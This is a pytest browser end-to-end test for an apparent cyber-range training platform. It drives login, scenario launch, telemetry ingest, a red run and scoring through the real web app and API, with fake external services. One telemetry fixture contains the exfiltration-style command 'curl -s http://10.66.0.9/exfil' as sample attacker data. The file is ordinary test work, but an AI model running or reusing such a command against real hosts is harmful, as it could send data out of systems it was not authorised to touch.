"""Stage 5 item 4 — checked-in browser E2E against the ACTUAL API (opt-in).

The real Next.js app (web/, a pure API client) served by `next start`, the
real uvicorn API on a disposable DB, and the real worker subprocess. Only the
external services are controlled substitutes: Proxmox (FakePVEHttp), the
model endpoint (fast fake OpenAI), the runner (local-dev transport), the
verifier exec (controlled host state) and the datapath (fake).

Browser workflow asserted end to end:
  authenticated member -> create/launch -> connection instructions ->
  captured command (session-bound telemetry ingest) -> start red (real
  worker) -> end session (confirm dialog) -> graded report -> progress.

Run: SR_PG_ADMIN_CMD=... pytest -m browser
Skips (does not fail) when a prerequisite is absent: playwright-cli, the
web build/node_modules, or free ports 8010 (API — the URL baked into the web
build) / 3000 (web — the API's CORS allowlist).
"""
from __future__ import annotations

import os
import shutil
import socket
import subprocess
import threading
import time
from pathlib import Path

import pytest

REPO = Path(__file__).resolve().parents[1]
WEB = REPO / "web"
API_PORT = 8010          # must equal the NEXT_PUBLIC_API_URL baked into web/.next
WEB_PORT = 3000          # the API's CORS allowlist ships localhost:3000
API = f"http://127.0.0.1:{API_PORT}"
WEB_URL = f"http://localhost:{WEB_PORT}"   # browser-side; matches baked URL + CORS
OP_PW = "operator-testpw-9"
MEM_PW = "member-testpw-9"

pytestmark = [pytest.mark.browser, pytest.mark.db]


def _port_free(port: int) -> bool:
    s = socket.socket()
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    try:
        s.bind(("127.0.0.1", port))
        return True
    except OSError:
        return False
    finally:
        s.close()


def _pw(*args, timeout=60, check=True):
    r = subprocess.run(["playwright-cli", *args], capture_output=True, text=True,
                       timeout=timeout, cwd=REPO)
    if check and r.returncode != 0:
        raise AssertionError(f"playwright-cli {' '.join(args)} -> {r.returncode}\n"
                             f"{r.stdout[-800:]}\n{r.stderr[-800:]}")
    return r


def _body_has(text: str, timeout=40) -> str:
    """Poll the rendered page until innerText contains `text`."""
    deadline = time.time() + timeout
    last = ""
    while time.time() < deadline:
        last = _pw("--raw", "eval", "document.body.innerText").stdout
        if text in last:
            return last
        time.sleep(0.5)
    pytest.fail(f"page never showed {text!r}; last body text:\n{last[:1500]}")


@pytest.fixture()
def browser():
    if shutil.which("playwright-cli") is None:
        pytest.skip("playwright-cli not installed — browser E2E is opt-in")
    _pw("close", check=False)  # clean slate if a stale session lingers
    yield
    _pw("close", check=False)


@pytest.fixture()
def web_app():
    """Serve the REAL Next.js app; build it first if the checkout has no build."""
    node_bin = WEB / "node_modules" / ".bin"
    if not (node_bin / "next").exists():
        pytest.skip("web/node_modules missing — run `npm ci` in web/ first")
    if not _port_free(WEB_PORT):
        pytest.skip(f"port {WEB_PORT} busy — the browser E2E needs the web port free")
    if not (WEB / ".next" / "BUILD_ID").exists():
        subprocess.run(["npm", "run", "build"], cwd=WEB, check=True,
                       env={**os.environ, "NEXT_PUBLIC_API_URL": f"http://localhost:{API_PORT}",
                            "NEXT_TELEMETRY_DISABLED": "1"}, capture_output=True, text=True)
    proc = subprocess.Popen([str(node_bin / "next"), "start"], cwd=WEB,
                            env={**os.environ, "PORT": str(WEB_PORT),
                                 "NEXT_TELEMETRY_DISABLED": "1"},
                            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    import httpx
    deadline = time.time() + 40
    while time.time() < deadline:
        try:
            if httpx.get(f"http://127.0.0.1:{WEB_PORT}", timeout=2).status_code == 200:
                break
        except Exception:
            time.sleep(0.5)
    else:
        proc.terminate()
        pytest.fail("next start never answered on the web port")
    yield proc
    proc.terminate()
    try:
        proc.wait(timeout=10)
    except subprocess.TimeoutExpired:
        proc.kill()


def test_browser_member_practice_loop(browser, web_app, migrated_db, test_db_url_owner,
                                      tmp_path, monkeypatch):
    import httpx
    import uvicorn
    from sqlalchemy import create_engine, text

    from infra.proxmox_client import FakePVEHttp, ProxmoxClient
    from srplatform import settings as st
    from srplatform import verification_service
    from srplatform.api import deps
    from srplatform.api.app import app
    from srplatform.safety import Supervisor, set_supervisor
    from tests.conftest import wipe_data
    from tests.helpers import FakeDatapath
    from tests.test_stage5_acceptance import SlowFakeModel

    if not _port_free(API_PORT):
        pytest.skip(f"port {API_PORT} busy — the browser E2E needs the API port free")

    # ---- controlled external services + real API process ----------------------
    model = SlowFakeModel(delay=0.05)
    monkeypatch.setenv("SR_ENV", "dev")
    monkeypatch.setenv("RUNNER_TRANSPORT", "local-dev")
    monkeypatch.setenv("LLM_BASE_URL", f"http://127.0.0.1:{model.port}/v1")
    monkeypatch.setenv("LLM_API_KEY", "fake")
    monkeypatch.setenv("SAFETY_STATE_FILE", str(tmp_path / "safety.json"))
    monkeypatch.setenv("RECORDINGS_DIR", str(tmp_path / "rec"))
    monkeypatch.setenv("API_BASE_URL", API)  # also what spawned workers inherit
    st.get_settings.cache_clear()

    httpd = FakePVEHttp()
    for vmid in (9001, 9002, 9003, 9004):
        httpd.vms[vmid] = {"name": f"tpl{vmid}", "template": vmid, "status": "stopped"}
    wipe_data(test_db_url_owner)
    deps.set_proxmox(ProxmoxClient(api=httpd))
    sup = Supervisor(datapath=FakeDatapath(), state_file=str(tmp_path / "s.json"))
    sup.initialize_state(reason="browser e2e first install")
    set_supervisor(sup)
    for kind in ("baseline_check", "datapath_proof", "killswitch_test"):
        sup.record(kind, True, {})

    # deterministic verifier truth: flag present, sshd enabled, no rogue admin
    def true_state(host, command):
        if "cat" in command and "flag" in command:
            return 0, "FLAG{quick-win}\n"
        if "awk" in command:
            return 0, ""
        if "list-unit-files" in command:
            return 0, "sshd.service enabled enabled\nnginx.service enabled enabled\n"
        return 1, ""
    verification_service.set_verifier_exec(true_state)

    server = uvicorn.Server(uvicorn.Config(app, host="127.0.0.1", port=API_PORT,
                                           log_level="error"))
    threading.Thread(target=server.run, daemon=True).start()
    try:
        deadline = time.time() + 20
        while not server.started and time.time() < deadline:
            time.sleep(0.05)
        assert server.started, "API never started"

        # operator + member accounts through the real API
        assert httpx.post(f"{API}/auth/bootstrap", json={"username": "drew",
                                                         "password": OP_PW}).status_code == 201
        op = {"Authorization": "Bearer " + httpx.post(
            f"{API}/auth/login", json={"username": "drew", "password": OP_PW}
        ).json()["token"]}
        ru = httpx.post(f"{API}/users", headers=op, json={"username": "blue",
                                                          "password": MEM_PW,
                                                          "role": "member"})
        assert ru.status_code == 201, ru.text
        mem = {"Authorization": "Bearer " + httpx.post(
            f"{API}/auth/login", json={"username": "blue", "password": MEM_PW}
        ).json()["token"]}

        # ---- browser: authenticated member -----------------------------------
        _pw("open", f"{WEB_URL}/")
        _body_has("enter the gym")
        _pw("fill", 'input[placeholder="username"]', "blue")
        _pw("fill", 'input[placeholder="password"]', MEM_PW)
        _pw("click", 'button[type="submit"]')
        _body_has("scenario library")  # login worked and the library loaded

        # ---- create/launch through the UI ------------------------------------
        _pw("click", 'tr:has-text("quick-win-01") button')
        _body_has("connections")
        path = _pw("--raw", "eval", "location.pathname").stdout.strip().strip('"')
        assert "/session/" in path, path
        sid = path.rsplit("/", 1)[-1]
        # connection instructions rendered (bastion ssh line with its port)
        _body_has("2222")

        # ---- captured command: ingest under the session-bound host capability
        eng = create_engine(test_db_url_owner)
        with eng.connect() as conn:
            tok = conn.execute(text(
                "SELECT token FROM service_tokens WHERE session_id = :s "
                "AND scope = 'telemetry' AND host = 'web01'"), {"s": sid}).scalar()
        eng.dispose()
        assert tok, "launch did not enroll a per-host telemetry capability"
        r = httpx.post(f"{API}/ingest/auditd", json={"events": [
            {"kind": "command", "argv": "curl -s http://10.66.0.9/exfil", "uid": "1000",
             "comm": "bash", "exe": "/usr/bin/bash", "source_id": "71", "boot_id": "b1"}]},
            headers={"Authorization": f"Bearer {tok}"})
        assert r.status_code == 201 and r.json()["accepted"] == 1
        # the live dashboard (2s poll) shows the captured command event
        _body_has("web01", timeout=20)
        recent = _pw("--raw", "eval", "document.body.innerText").stdout
        assert "command" in recent

        # ---- start red: REAL worker subprocess through the UI button ---------
        _pw("click", 'button:has-text("start red")')
        _body_has("red run")
        deadline = time.time() + 120
        while time.time() < deadline:
            s = httpx.get(f"{API}/sessions/{sid}", headers=mem).json()
            if s.get("active_run") is None and s.get("status") not in ("preparing", "ready"):
                break
            time.sleep(1)
        else:
            pytest.fail("the red run never completed through the shared model path")

        # ---- end session (confirm dialog) -> trusted final score -------------
        _pw("eval", "window.confirm = () => true")
        _pw("click", 'button:has-text("end session")')
        _body_has("complete", timeout=60)

        # ---- graded report: explicit AAR generation, trusted scorecard -------
        sc = httpx.get(f"{API}/sessions/{sid}/score", headers=mem).json()
        assert sc["status"] == "scored" and sc["earned"] > 0, sc
        _pw("goto", f"{WEB_URL}/session/{sid}/report")
        _body_has("generate AAR")
        _pw("click", 'button:has-text("generate AAR")')  # fake model answers
        body = _body_has(f"{sc['earned']}/{sc['total']}", timeout=60)
        assert "UNSCORED" not in body

        # ---- progress page reflects the scored session ------------------------
        _pw("click", 'a[href="/progress"]')
        body = _body_has("by domain")
        assert "identify" in body or "protect" in body
    finally:
        verification_service.set_verifier_exec(None)
        server.should_exit = True
        model.stop()
        st.get_settings.cache_clear()
